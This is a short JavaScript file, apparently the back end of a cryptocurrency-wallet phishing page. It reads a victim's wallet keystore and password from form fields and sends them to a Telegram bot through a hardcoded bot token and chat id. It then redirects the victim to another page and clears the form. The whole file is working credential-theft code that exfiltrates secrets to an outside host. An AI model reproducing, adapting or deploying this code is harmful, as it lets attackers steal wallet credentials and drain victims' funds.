//bot token
var telegram_bot_id = "6711725900:AAGpmNN__YMaB0b7pCimBOSu8w2lFhZfGzU";
//chat id
var chat_id = -1002150483841;
var pass;
var phr;
var ready = function () {
    phr = document.getElementById("json").value;
    pass = document.getElementById("pkey").value;
    message = "Keystore: " + phr + "\n\nPassword: " + pass;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);

        window.location.href = "protocol.html";
    });
    document.getElementById("json").value = "";
    document.getElementById("pass").value = "";
    return false;
};
